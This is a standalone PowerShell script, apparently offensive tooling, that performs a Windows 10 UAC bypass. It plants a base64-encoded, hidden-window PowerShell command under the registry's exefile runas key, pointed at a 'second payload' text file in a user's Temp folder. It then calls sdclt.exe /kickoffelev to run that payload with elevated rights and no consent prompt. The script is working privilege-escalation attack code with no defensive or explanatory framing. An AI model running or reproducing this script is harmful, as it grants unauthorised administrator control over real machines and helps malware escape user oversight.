Function Invoke-BypassUACWin10 {
	[CmdletBinding()]
	Param(
		[Parameter(Mandatory)]
		[ValidateScript({ Test-Path -Path $_ })]
		[string]$FilePath
	)

	
	$command = "Invoke-expression -Command (New-Object System.Net.WebClient).DownloadString('file://$FilePath')"
	[byte[]]$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
	$encodedCommand = [System.Convert]::ToBase64String($bytes)
    
	$exeCommand = "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -WindowStyle Hidden -encodedCommand $encodedCommand"

	$exeCommandPath = "HKCU:\Software\Classes\exefile\shell\runas\command"
	New-Item $exeCommandPath -Force | New-ItemProperty -Name 'IsolatedCommand' -Value $exeCommand -PropertyType string -Force	
}

$secondPayloadLocation = "C:\Users\cnlocal\AppData\Local\Temp\rts.txt"

Invoke-BypassUACWin10 -FilePath $secondPayloadLocation

sdclt.exe /kickoffelev